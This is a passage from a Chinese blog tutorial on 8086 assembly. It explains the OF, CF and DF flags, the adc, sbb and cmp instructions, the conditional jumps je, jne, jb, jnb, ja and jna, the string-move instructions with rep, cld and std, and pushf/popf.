<h2 id="OF标志"><a href="#OF标志" class="headerlink" title="OF标志"></a>OF标志</h2><p>OF是溢出标志位，记录是否产生了溢出，一定要注意CF和OF的区别：</p>
<ul>
<li>CF是对无符号数运算有意义的标志位，对于无符号数运算，CPU用CF位来记录是否产生了进位</li>
<li>OF是对有符号数运算有意义的标志位，对于有符号数运算，CPU用OF位来记录是否产生了溢出</li>
</ul>
<h2 id="adc指令"><a href="#adc指令" class="headerlink" title="adc指令"></a>adc指令</h2><p>adc是带进位加法指令，它利用了CF位上记录的进位值</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc 操作对象1，操作对象2</span><br></pre></td></tr></table></figure>

<p>功能：</p>
<p>操作对象1 = 操作对象1 + 操作对象2 + CF</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adc ax,bx</span><br></pre></td></tr></table></figure>

<p>其实现的功能是：(ax)=(ax)+(bx)+CF</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">mov bx,1</span><br><span class="line">sub bx,ax</span><br><span class="line">adc ax,1</span><br></pre></td></tr></table></figure>

<p>执行后，(ax)=4，相当于计算：（ax）+1+CF=2+1+1=4</p>
<p>在执行adc指令的时候加上的CF的值的含义，由之前的指令决定的，也就是说关键在于所加上的CF值是被什么指令设置的，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位值</p>
<h2 id="sbb指令"><a href="#sbb指令" class="headerlink" title="sbb指令"></a>sbb指令</h2><p>sbb是带借位减法指令，它利用了CF位上记录的借位值</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb 操作对象1，操作对象2</span><br></pre></td></tr></table></figure>

<p>功能：</p>
<p>操作对象1 = 操作对象1 - 操作对象2 - CF</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sbb ax,bx</span><br></pre></td></tr></table></figure>

<p>其实现的功能是：(ax)=(ax)-(bx)-CF</p>
<h2 id="cmp指令"><a href="#cmp指令" class="headerlink" title="cmp指令"></a>cmp指令</h2><p>cmp是比较指令，功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响，其他相关指令通过识别这些被影响的标志寄存器来得知比较结果</p>
<p>格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp 操作对象1，操作对象2</span><br></pre></td></tr></table></figure>

<p>功能：</p>
<p>操作对象1 - 操作对象2 ，但并不保存结果，仅仅根据计算结果对标志寄存器进行设置</p>
<p>例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,ax</span><br></pre></td></tr></table></figure>

<p>做(ax)-(ax)的运算，结果为0，但并不在ax中保存，仅影响flag的相关各位，指令执行后：</p>
<ul>
<li>ZF=1</li>
<li>PF=1</li>
<li>SF=0</li>
<li>CF=0</li>
<li>OF=0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,8</span><br><span class="line">mov bx,3</span><br><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure>

<p>指令执行后：</p>
<ul>
<li><p>(ax)=8</p>
</li>
<li><p>ZF=0</p>
</li>
<li><p>PF=1</p>
</li>
<li><p>SF=0</p>
</li>
<li><p>CF=0</p>
</li>
<li><p>OF=0</p>
</li>
</ul>
<p>可以得到以下逻辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,bx</span><br></pre></td></tr></table></figure>

<ul>
<li>如果(ax)=(bx)，则(ax)-(bx)=0，所以：ZF=1</li>
<li>如果(ax)!=(bx)，则(ax)-(bx)!=0，所以：ZF=0</li>
<li>如果(ax)&lt;(bx)，则(ax)-(bx)将产生借位，所以：CF=1</li>
<li>如果(ax)&gt;=(bx)，则(ax)-(bx)不必借位，所以：CF=0</li>
<li>如果(ax)&gt;(bx)，则(ax)-(bx)不必借位且结果也不为0，所以：CF=0且ZF=0</li>
<li>如果(ax)&lt;=(bx)，则(ax)-(bx)既可能产生借位且结果又可能为0，所以：CF=1且ZF=1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmp ax,ax</span><br></pre></td></tr></table></figure>

<ul>
<li>ZF=1，说明(ax)=(bx)</li>
<li>ZF=0，说明(ax)!=(bx)</li>
<li>CF=1，说明(ax)&lt;(bx)</li>
<li>CF=0，说明(ax)&gt;=(bx)</li>
<li>CF=0且ZF=0，说明(ax)&gt;(bx)</li>
<li>CF=1或ZF=1，说明(ax)&lt;=(bx)</li>
</ul>
<h2 id="检测比较结果的条件转移指令"><a href="#检测比较结果的条件转移指令" class="headerlink" title="检测比较结果的条件转移指令"></a>检测比较结果的条件转移指令</h2><table>
<thead>
<tr>
<th align="center">指令</th>
<th align="center">含义</th>
<th align="center">检测的相关标志位</th>
</tr>
</thead>
<tbody><tr>
<td align="center">je</td>
<td align="center">等于则转移</td>
<td align="center">ZF=1</td>
</tr>
<tr>
<td align="center">jne</td>
<td align="center">不等于则转移</td>
<td align="center">ZF=0</td>
</tr>
<tr>
<td align="center">jb</td>
<td align="center">低于则转移</td>
<td align="center">CF=1</td>
</tr>
<tr>
<td align="center">jnb</td>
<td align="center">不低于则转移</td>
<td align="center">CF=0</td>
</tr>
<tr>
<td align="center">ja</td>
<td align="center">高于则转移</td>
<td align="center">CF=0,ZF=0</td>
</tr>
<tr>
<td align="center">jna</td>
<td align="center">不高于则转移</td>
<td align="center">CF=1或ZF=1</td>
</tr>
</tbody></table>
<p>这些指令都比较常用，它们所检测的标志位都是cmp指令进行无符号数比较时记录比较结果的标志位：</p>
<ul>
<li><p>j：表示jump</p>
</li>
<li><p>e：表示equal</p>
</li>
<li><p>ne：表示not equal</p>
</li>
<li><p>b：表示below</p>
</li>
<li><p>nb：表示not below</p>
</li>
<li><p>a：表示above</p>
</li>
<li><p>na：表示note above</p>
</li>
</ul>
<h2 id="DF标志和串传送指令"><a href="#DF标志和串传送指令" class="headerlink" title="DF标志和串传送指令"></a>DF标志和串传送指令</h2><p>DF是方向标志位，在串处理指令中，控制每次操作后si，di的增减</p>
<ul>
<li>DF=0：每次操作后si，di递增</li>
<li>DF=1：每次操作后si，di递减</li>
</ul>
<p>格式1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsb</span><br></pre></td></tr></table></figure>

<p>将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减</p>
<p>功能：（以字节为单位传送）</p>
<ul>
<li>((es)<em>16+(di))=((ds)</em>16+(si))</li>
<li>如果DF=0，则：<ul>
<li>(si)=(si)+1</li>
<li>(di)=(di)+1</li>
</ul>
</li>
<li>如果DF=1，则：<ul>
<li>(si)=(si)-1</li>
<li>(di)=(di)-1</li>
</ul>
</li>
</ul>
<p>格式1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movsw</span><br></pre></td></tr></table></figure>

<p>将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器DF位的值，将si和di递增2或递减2</p>
<p>功能：（以字为单位传送）</p>
<ul>
<li>((es)<em>16+(di))=((ds)</em>16+(si))</li>
<li>如果DF=0，则：<ul>
<li>(si)=(si)+2</li>
<li>(di)=(di)+2</li>
</ul>
</li>
<li>如果DF=1，则：<ul>
<li>(si)=(si)-2</li>
<li>(di)=(di)-2</li>
</ul>
</li>
</ul>
<p>movsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep movsb</span><br></pre></td></tr></table></figure>

<p>rep的作用是根据cx的值，重复执行后面的串送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前个单元，则rep movsb就可以循环实现（cx）个字符的传送</p>
<p>8086CPU提供以下两条指令对DF位进行设置：</p>
<ul>
<li>cld指令：将标志寄存器的DF置0</li>
<li>std指令：将标志寄存器的DF置1</li>
</ul>
<h2 id="pushf和popf"><a href="#pushf和popf" class="headerlink" title="pushf和popf"></a>pushf和popf</h2><ul>
<li>pushf：将标志寄存器的值压栈</li>
<li>popf：从栈中弹出数据，送入标志寄存器中</li>
</ul>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Vorherige Seite"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Nächste Seite"></i></a>
  </nav>


          </div>
          

        </div>
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Inhaltsverzeichnis
        </li>
        <li class="sidebar-nav-overview">
          Übersicht
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
  <div class="site-description" itemprop="description">Resit much,Obey little</div>
</div>
  <nav class="site-state motion-element">
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">Artikel</span>
        </a>
      </div>
    
      
      
      <div class="site-state-item site-state-categories">
        
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">Kategorien</span>
        
      </div>
    
  </nav>
  <div class="feed-link motion-element">
    <a href="/atom.xml" rel="alternate">
      <i class="fa fa-rss"></i>RSS
    </a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
</div>
  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>

<div>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<span id="busuanzi_container_site_pv" style='display:none'>
    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
    <span class="post-meta-divider">|</span>
</span>
<span id="busuanzi_container_site_uv" style='display:none'>
    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
</span>
</div>

        












        
      </div>
    </footer>
  </div>

  


  <script src="/lib/anime.min.js?v=3.1.0"></script>
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
<script src="/js/schemes/pisces.js?v=7.4.0"></script>

<script src="/js/next-boot.js?v=7.4.0"></script>



  








  <script src="/js/local-search.js?v=7.4.0"></script>














  

  

  

</body>
</html>
